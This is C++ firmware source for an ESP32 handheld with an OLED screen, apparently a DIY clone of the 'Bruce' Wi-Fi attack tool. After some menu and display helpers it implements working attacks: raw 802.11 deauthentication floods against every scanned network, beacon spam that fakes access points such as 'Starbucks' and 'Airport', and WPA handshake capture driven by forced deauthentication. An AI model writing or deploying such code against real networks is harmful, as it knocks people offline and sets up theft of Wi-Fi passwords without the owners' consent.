void drawSubMenu(const char* title, const char* items[], int size, int selected) {
  display.clearDisplay();
  drawTopBar();
  display.setCursor((128 - strlen(title) * 6) / 2, 22);
  display.print(title);
  display.drawLine(0, 28, 128, 28, SSD1306_WHITE);
  int start = 0;
  if (selected >= 2) start = selected - 1;
  if (start + 3 > size) start = size - 3;
  if (start < 0) start = 0;
  for (int i = start; i < start + 3 && i < size; i++) {
    int y = 38 + (i - start) * 10;
    if (i == selected) {
      display.fillRect(0, y - 6, 128, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(10, y);
      display.print(items[i]);
      display.setTextColor(SSD1306_WHITE);
    } else {
      display.setCursor(10, y);
      display.print(items[i]);
    }
  }
  display.display();
}

void showMessage(const char* msg, int delayMs) {
  display.clearDisplay();
  drawTopBar();
  display.setTextSize(1);
  display.setCursor(10, 35);
  display.print(msg);
  display.display();
  delay(delayMs);
}

void bootAnimation() {
  for (int x = 128; x >= 0; x -= 8) {
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(x, 28);
    display.print("DIY");
    display.setTextSize(1);
    display.setCursor(x + 35, 45);
    display.print("BRUCE");
    display.display();
    delay(10);
  }
  delay(500);
}

// ==================== WIFI ФУНКЦІЇ ====================
void wifiScan() {
  showMessage("SCANNING...",500);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);
  networkCount = WiFi.scanNetworks();
  if (networkCount > 50) networkCount = 50;
  for (int i = 0; i < networkCount; i++) {
    networkNames[i] = WiFi.SSID(i);
    networkChannel[i] = WiFi.channel(i);
    memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
  }
  char buf[32];
  sprintf(buf, "FOUND:%d", networkCount);
  showMessage(buf,1500);
  WiFi.mode(WIFI_AP_STA);
}

void sendDeauth(uint8_t* bssid, uint8_t* client, int ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t p[26] = {0xC0,0x00,0x00,0x00,
                   client[0],client[1],client[2],client[3],client[4],client[5],
                   bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
                   bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
                   0x00,0x00,0x07,0x00};
  esp_wifi_80211_tx(WIFI_IF_STA, p, 26, false);
  deauthPackets++;
}

void wifiDeauth() {
  if (networkCount == 0) { showMessage("SCAN FIRST!",1000); return; }
  deauthActive = true;
  deauthPackets = 0;
  showMessage("DEAUTH STARTED",1000);
  uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  while (deauthActive) {
    for (int i = 0; i < networkCount && deauthActive; i++) {
      sendDeauth(networkBSSID[i], broadcast, networkChannel[i]);
    }
    if (checkButton(BTN_BACK)) deauthActive = false;
    delay(10);
  }
  showMessage("DEAUTH STOPPED",1000);
}

void wifiBeacon() {
  beaconActive = true;
  beaconPackets = 0;
  const char* ssids[] = {"FREE_WIFI","Starbucks","Airport","Metro","Public"};
  showMessage("BEACON STARTED",1000);
  while (beaconActive) {
    for (int s = 0; s < 5 && beaconActive; s++) {
      uint8_t bssid[6];
      for(int i=0;i<6;i++) bssid[i]=random(256);
      bssid[0]|=0x02;
      uint8_t p[200];
      int len=0;
      p[len++]=0x80; p[len++]=0x00; p[len++]=0x00; p[len++]=0x00;
      for(int i=0;i<6;i++) p[len++]=0xFF;
      for(int i=0;i<6;i++) p[len++]=bssid[i];
      for(int i=0;i<6;i++) p[len++]=bssid[i];
      p[len++]=0x00; p[len++]=0x00;
      for(int i=0;i<8;i++) p[len++]=0x00;
      p[len++]=0x64; p[len++]=0x00;
      p[len++]=0x11; p[len++]=0x00;
      p[len++]=0x00; p[len++]=strlen(ssids[s]);
      for(int i=0;i<(int)strlen(ssids[s]);i++) p[len++]=ssids[s][i];
      esp_wifi_80211_tx(WIFI_IF_STA, p, len, false);
      beaconPackets++;
    }
    if(checkButton(BTN_BACK)) beaconActive=false;
    delay(30);
  }
}

void handshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(!handshakeCapturing) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int len = pkt->rx_ctrl.sig_len;
  uint8_t* payload = pkt->payload;
  if(len<30) return;
  for(int i=0;i<len-8;i++){
    if(payload[i]==0x88 && payload[i+1]==0x8E){
      eapolCount++;
      handshakes += "[HANDSHAKE] "+currentTarget+"\n";
      showMessage("HANDSHAKE CAPTURED!",2000);
      handshakeCapturing=false;
      return;
    }
  }
}

void wifiHandshake() {
  if(networkCount==0){ showMessage("SCAN FIRST!",1000); return; }
  int target=0;
  while(true){
    display.clearDisplay();
    drawTopBar();
    display.setCursor(5,15);
    display.print("Select AP:");
    for(int i=0;i<min(4,networkCount);i++){
      if(i==target) display.fillRect(0,30+i*8,128,8,SSD1306_WHITE);
      display.setCursor(20,30+i*8);
      if(i==target) display.setTextColor(SSD1306_BLACK);
      display.print(networkNames[i].substring(0,12));
      display.setTextColor(SSD1306_WHITE);
    }
    display.display();
    if(checkButton(BTN_UP) && target>0) target--;
    else if(checkButton(BTN_DOWN) && target<min(4,networkCount)-1) target++;
    else if(checkButton(BTN_OK)) break;
    else if(checkButton(BTN_BACK)) return;
    delay(50);
  }
  currentTarget=networkNames[target];
  esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
  handshakeCapturing=true;
  eapolCount=0;
  showMessage("CAPTURING...",1500);
  unsigned long start=millis();
  while(handshakeCapturing && millis()-start<30000){
    sendDeauth(networkBSSID[target], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, networkChannel[target]);
    delay(100);
  }
  handshakeCapturing=false;
  if(eapolCount>0) showMessage("HANDSHAKE SAVED!",1500);
  else showMessage("FAILED",1500);
}

